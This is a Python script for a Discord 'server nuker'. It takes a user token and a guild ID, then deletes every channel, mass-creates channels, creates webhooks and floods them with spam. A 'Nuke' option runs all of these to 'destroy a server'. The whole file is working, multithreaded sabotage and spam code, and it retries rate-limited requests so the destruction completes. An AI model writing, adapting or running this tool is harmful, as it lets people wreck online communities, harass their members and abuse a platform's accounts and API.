import requests, os, json, time, threading
import queue as _queue

with open("Modules//Discord///NukeServer////config.json", "r") as config_file:
    config = json.loads(config_file.read())
print("""



""")
token = input('       Token -> ')
msgg = input('       Messages -> ')
max_threads = config['global_thread_count']
guild = None

class c:
    RES = "\033[0;1m"
    END = "\033[0m"
    ITAL = "\033[1;3m"
    UNDERLINE = "\033[1;4m"
    WH = "\033[1;97m"
    CY = "\033[1;96m"
    BL = "\033[1;94m"
    RED = "\033[1;31m"
    GRE = "\033[1;92m"

def end():
    input(f"\n {c.WH}[ {c.ITAL}{c.CY}Press Enter to Close {c.RES}{c.WH}] {c.GRE}> {c.RES}{c.ITAL}{c.WH}")
    print(f"{c.END}")
    exit()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def check_valid():
    return requests.get("https://discord.com/api/v6/users/@me", headers={"Authorization": token}).status_code == 200

def check_guild():
    return requests.get(f"https://discord.com/api/v6/guilds/{guild}", headers={"Authorization": token}).status_code == 200

def guild_info():
    try:
        return requests.get(f"https://discord.com/api/v6/guilds/{guild}", headers={"Authorization": token}).json()
    except:
        print(f"{c.WH} [ {c.ITAL}{c.UNDERLINE}{c.RED}ERROR{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Unable to fetch guild info. You may have been banned.{c.END}")
        end()

def get_channel_ids():
    listing = requests.get(f"https://discord.com/api/v6/guilds/{guild}/channels", headers={"Authorization": token}).json()
    return [server['id'] for server in listing]

def delchannels():
    info = guild_info()
    channels = get_channel_ids()
    print(f"{c.WH} [ {c.ITAL}{c.RED}DELCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Attempting to delete {len(channels)} channels in {info['name']} ({info['id']}){c.END}")
    queue = _queue.Queue()
    [queue.put(channel) for channel in channels]
    if len(channels) < max_threads:
        thread_count = queue.qsize()
    else:
        thread_count = max_threads
    print(f"{c.WH} [ {c.ITAL}{c.RED}DELCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Performing DelChannels with {thread_count} threads on {len(channels)} channels.{c.END}")
    def del_worker():
        while True:
            channel = queue.get()
            response = requests.delete(f"https://discord.com/api/v6/channels/{channel}", headers={"Authorization": token})
            if response.status_code == 200:
                print(f"{c.WH} [ {c.ITAL}{c.RED}DELCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Deleted channel: {channel}{c.END}")
            else:
                if response.status_code == 429:
                    queue.put(channel)
                print(f"{c.WH} [ {c.ITAL}{c.RED}DELCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Failed to delete channel: {channel}{c.END}")
            queue.task_done()
    start = time.perf_counter()
    for _ in range(thread_count):
        threading.Thread(target=del_worker, daemon=True).start()
    queue.join()
    print(f"{c.WH} [ {c.ITAL}{c.RED}DELCHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Operation complete, tango down. ({round(time.perf_counter() - start, 2)} seconds){c.END}")

def makechannels():
    count = config['chan_nuke_amount']
    queue = _queue.Queue()
    [queue.put(i) for i in range(count)]
    if count < max_threads:
        thread_count = count
    else:
        thread_count = max_threads
    print(f"{c.WH} [ {c.ITAL}{c.RED}MAKECHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Performing MakeChannels with {thread_count} threads making {count} channels.{c.END}")
    def make_worker():
        while True:
            item = queue.get()
            response = requests.post(f"https://discord.com/api/v6/guilds/{guild}/channels", headers={"Authorization": token}, json={"name": config['chan_nuke_name'], "type": 0})
            if response.status_code == 201:
                print(f"{c.WH} [ {c.ITAL}{c.RED}MAKECHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Created channel: {response.json()['id']}{c.END}")
            else:
                if response.status_code == 429:
                    queue.put(item)
                print(f"{c.WH} [ {c.ITAL}{c.RED}MAKECHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Failed to create channel: {response.json()['message']}{c.END}")
            queue.task_done()
    start = time.perf_counter()
    for _ in range(thread_count):
        threading.Thread(target=make_worker, daemon=True).start()
    queue.join()
    print(f"{c.WH} [ {c.ITAL}{c.RED}MAKECHANNELS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Operation complete, tango down. ({round(time.perf_counter() - start, 2)} seconds){c.END}")

def webhooks():
    data = get_webhook_data()
    hooks = []
    if len(data['hooks']) < 1:
        hooks = create_webhooks()
    else:
        hooks = data['hooks']
    spam_webhooks(hooks)

def nuke():
    methods = [delchannels, makechannels, webhooks]
    print(f"{c.WH} [ {c.ITAL}{c.RED}NUKE{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Destroying server using the following modules: [DelChannels, MakeChannels, Webhooks]{c.END}")
    for method in methods:
        try:
            method()
        except Exception as e:
            print(f"{c.WH} [ {c.ITAL}{c.UNDERLINE}{c.RED}ERROR{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}{e}{c.END}")

def spam_webhooks(hooks):
    print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Spamming {len(hooks)} webhooks {config['spam_per_webhook']} times.{c.END}")
    start = time.perf_counter()
    for _ in range(config['spam_per_webhook']):
        queue = _queue.Queue()
        [queue.put(webhook) for webhook in hooks]
        def spam_worker():
            while True:
                url = queue.get()
                requests.post(url, data={"content": (msgg) }, timeout=5)
                queue.task_done()
        for _ in range(len(hooks)):
            threading.Thread(target=spam_worker, daemon=True).start()
        queue.join()
        time.sleep(1)
    print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Operation complete, tango down. ({round(time.perf_counter() - start, 2)} seconds){c.END}")

def create_webhooks():
    hooks = []
    info = guild_info()
    queue = _queue.Queue()
    channels = [channel for channel in get_channel_ids()]
    if len(channels) > 50:
        [queue.put(i) for i in channels[:50]]
    else:
        [queue.put(i) for i in channels]
    if len(channels) < max_threads:
        thread_count = len(channels)
    else:
        thread_count = max_threads
    print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Creating {queue.qsize()} webhooks with {thread_count} threads.{c.END}")
    def make_worker():
        while True:
            channel = queue.get()
            try:
                response = requests.post(f"https://discord.com/api/v6/channels/{channel}/webhooks", headers={"Authorization": token}, json={"name": config['webhook_name']}, timeout=5)
            except:
                print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Failed to create webhook. Error: Internal HTTP Exception.{c.END}")
                queue.task_done()
            if "message" in response.json():
                print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Failed to create webhook. Error: {response.json()['message']}{c.END}")
            else:
                data = response.json()
                url = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
                print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Created webhook: {url}{c.END}")
                hooks.append(url)
            time.sleep(1)
            queue.task_done()
    start = time.perf_counter()
    for _ in range(thread_count):
        threading.Thread(target=make_worker, daemon=True).start()
    queue.join()
    print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Operation complete, tango down. ({round(time.perf_counter() - start, 2)} seconds){c.END}")
    data = get_webhook_data()
    temp = data['hooks']
    data['hooks'] = temp + hooks
    with open(f"webhooks/{info['id']}-wh.json", "w") as webhook_file:
        json.dump(data, webhook_file, indent=4)
    print(f"{c.WH} [ {c.ITAL}{c.RED}WEBHOOKS{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Webhooks saved to webhooks/{info['id']}-wh.json{c.END}")
    return data['hooks']

def get_webhook_data():
    check_webhook_files()
    with open(f"webhooks/{guild}-wh.json", "r") as webhook_file:
        return json.loads(webhook_file.read())

def check_webhook_files():
    info = guild_info()
    if not "webhooks" in os.listdir():
        os.mkdir("webhooks")
    if not f"{guild}-wh.json" in os.listdir("webhooks"):
        file = open(f"webhooks/{guild}-wh.json", "w+")
        data = {"name": info['name'], "hooks": []}
        json.dump(data, file, indent=4)
        file.close()

def main():

    clear()
    if not check_valid():
        print(f"{c.WH} [ {c.ITAL}{c.UNDERLINE}{c.RED}ERROR{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Invalid Token. Please note that bot accounts are not supported.{c.END}\n")
        end()
    
    global guild
    guild = input(f" {c.WH}[ {c.ITAL}{c.CY}Input Guild ID {c.RES}{c.WH}] {c.GRE}> {c.RES}{c.ITAL}{c.WH}")
    print(c.END)
    if not check_guild():
        print(f"{c.WH} [ {c.ITAL}{c.UNDERLINE}{c.RED}ERROR{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Invalid Guild ID. Please double check that you copied the correct ID.{c.END}\n")
        end()
    guild = int(guild)

    clear()
    print(f"{c.WH} [ {c.ITAL}{c.BL}1{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.CY}DelChannels{c.RES}:\t-> {c.ITAL}{c.BL}Delete all channels in the server.{c.END}")
    print(f"{c.WH} [ {c.ITAL}{c.BL}2{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.CY}MakeChannels{c.RES}:\t-> {c.ITAL}{c.BL}Create channels in the server.{c.END}")
    print(f"{c.WH} [ {c.ITAL}{c.BL}3{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.CY}Webhooks{c.RES}:\t-> {c.ITAL}{c.BL}Create webhooks if there are none saved, and spam them.{c.END}")
    print(f"{c.WH} [ {c.ITAL}{c.BL}4{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.CY}Nuke{c.RES}:\t\t-> {c.ITAL}{c.BL}Destroy a server.{c.END}")
    print(f"{c.WH} [ {c.ITAL}{c.BL}5{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.CY}Exit{c.END}\n")
    option = input(f" {c.WH}[ {c.ITAL}{c.CY}Select an Option {c.RES}{c.WH}] {c.GRE}> {c.RES}{c.ITAL}{c.WH}")
    print(c.END)

    def invalid_option():
        print(f"{c.WH} [ {c.ITAL}{c.UNDERLINE}{c.RED}ERROR{c.RES} {c.WH}] {c.GRE}- {c.ITAL}{c.BL}Invalid Option. Ending program...{c.END}\n")
        end()
    try:
        int(option)
    except:
        invalid_option()
    if int(option) > 5 or int(option) < 1:
        invalid_option()
    if option == "5":
        end()

    if option == "1":
        delchannels()
    elif option == "2":
        makechannels()
    elif option == "3":
        webhooks()
    elif option == "4":
        nuke()

    end()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        end()